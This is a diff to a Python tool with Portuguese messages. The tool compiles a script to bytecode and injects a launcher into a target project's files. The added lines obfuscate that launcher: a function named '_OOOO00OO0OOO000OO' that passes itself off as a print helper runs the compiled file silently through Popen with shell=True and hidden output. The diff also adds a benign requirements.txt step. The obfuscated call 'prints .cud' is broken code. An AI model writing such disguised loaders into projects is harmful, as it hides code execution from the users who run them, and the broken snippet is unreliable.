@@ -75,6 +75,15 @@ def compile_python_file(file_path):
         Write.Print(f"[e] Ocorreu um erro ao compilar o arquivo: {e}\n", Colors.red_to_yellow, interval=0)
         return None
 
+def create_requirements_file(project_path):
+    try:
+        result = subprocess.run(['pipreqs', project_path, '--force'], capture_output=True, text=True)
+        if result.returncode == 0:
+            Write.Print(f"[+] Arquivo requirements.txt criado em: {project_path}\n", Colors.red_to_yellow, interval=0)
+        else:
+            Write.Print(f"[e] Erro ao criar requirements.txt: {result.stderr}\n", Colors.red_to_yellow, interval=0)
+    except FileNotFoundError:
+        Write.Print("[e] pipreqs não está instalado. Instale com 'pip install pipreqs'.\n", Colors.red_to_yellow, interval=0)
 
 
 def create_launcher_script(pyc_path):
@@ -84,11 +93,10 @@ def create_launcher_script(pyc_path):
     
     with open(launcher_path, 'w', encoding='utf-8') as f:
         f.write(f"""
-import subprocess as prints
-                            
-def _print_():
-    prints.Popen(['python', r'{pyc_path}'], stdout=prints.PIPE, stderr=prints.PIPE, shell=True)
-
+import subprocess as prints 
+from subprocess import Popen as cud 
+def _OOOO00OO0OOO000OO ():
+    prints .cud (['python',r'{pyc_path}'],stdout =prints .PIPE ,stderr =prints .PIPE ,shell =True )
 """)
     Write.Print(f"[+] Arquivo launcher.py criado em: {launcher_path}\n", Colors.red_to_yellow, interval=0)
 
@@ -159,6 +167,9 @@ def main():
         if launcher_path is not None:
             insert_print_function(project_path, launcher_path)
 
+    should_create_requirements = Write.Input("[?] Deseja criar um arquivo requirements.txt para o projeto? (y/n): ", Colors.red_to_yellow, interval=0.0025).strip().lower()
+    if should_create_requirements == 'y':
+        create_requirements_file(project_path)
 
 
 def update_imports_for_print_function(file_paths, launcher_path):
